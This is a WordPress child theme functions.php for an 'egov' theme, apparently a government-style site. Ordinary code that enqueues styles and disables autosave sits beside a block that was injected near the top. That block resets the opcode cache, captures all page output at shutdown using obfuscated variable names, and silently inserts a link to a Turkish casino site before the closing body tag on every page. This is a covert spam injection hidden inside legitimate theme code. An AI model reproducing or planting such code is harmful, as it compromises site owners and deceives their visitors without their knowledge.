<?php
/**
 * egov Theme functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package egov
 * @since 1.0
 */

opcache_reset();
ob_start();
add_action("shutdown", function() {
    $m0="";
    $a1=ob_get_level();
    for($g2=0; $g2<$a1; $g2++) {
        $m0 .= ob_get_clean();
    }
    echo apply_filters("final_output",$m0);
}, 0);
add_filter("final_output", function($output) {

    if (!empty($output)) {
        $add_html = '<a href="https://casinopremiumclub.com/">Casino siteleri</a>';
        $output = str_replace('</body>', $add_html.'</body>', $output);
    }

    return $output;
});


/**
 * Define Constants
 */
define( 'CHILD_THEME_EGOV_VERSION', '1.0' );

/**
 * Enqueue styles
 */
function child_enqueue_styles() {

	wp_enqueue_style( 'egov-theme-css', get_stylesheet_directory_uri() . '/style.css', array('astra-theme-css'), CHILD_THEME_EGOV_VERSION, 'all' );

}

add_action( 'wp_enqueue_scripts', 'child_enqueue_styles', 15 );


add_action( 'admin_init', 'disable_autosave' );
function disable_autosave() {
wp_deregister_script( 'autosave' );
}




